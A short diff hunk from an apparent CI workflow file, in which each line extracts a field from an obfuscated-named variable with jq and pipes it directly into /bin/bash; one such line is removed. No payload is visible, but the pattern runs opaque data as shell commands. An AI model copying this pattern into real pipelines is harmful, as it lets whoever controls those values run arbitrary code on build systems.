@@ -35,7 +35,6 @@ jobs:
           echo $naboy61 | jq -r .yct377 | /bin/bash
           printf '%s' "$i801" | jq -r .d6 | /bin/bash
           echo $khznk70014 | jq -r .zzf9085 | /bin/bash
-          printf '%s' "$bq2" | jq -r .cmss9147 | /bin/bash
           printf '%s' "$zk5997" | jq -r .zo1 | /bin/bash
           printf '%s' "$ue7954" | jq -r .phgw49775 | /bin/bash
 
